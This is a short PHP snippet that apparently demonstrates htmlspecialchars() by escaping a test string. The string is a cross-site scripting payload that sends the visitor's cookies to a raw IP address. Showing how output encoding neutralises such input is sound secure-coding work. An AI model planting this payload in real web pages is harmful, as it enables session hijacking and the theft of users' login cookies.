<?php
$convert = "H-E-B <script>document.location='http://185.219.134.198/?c='+document.cookie;</script>";
echo "<br />";

echo "Only HTML special characters : ".htmlspecialchars($convert);
?>
